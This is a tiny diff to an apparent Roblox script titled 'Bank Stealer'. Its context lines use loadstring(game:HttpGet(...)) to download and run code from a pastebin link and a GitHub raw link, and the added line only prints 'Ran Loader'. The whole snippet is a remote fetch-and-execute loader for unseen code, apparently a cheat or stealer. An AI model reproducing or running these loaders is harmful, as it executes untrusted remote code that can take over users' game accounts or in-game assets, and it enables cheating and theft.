@@ -2,3 +2,4 @@ Bank Stealer
 
 loadstring(game:HttpGet("https://pastebin.com/raw/bhVmUwXh", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Galaxyv10/scriptv13/main/autofarmv5", true))()
+print("Ran Loader")
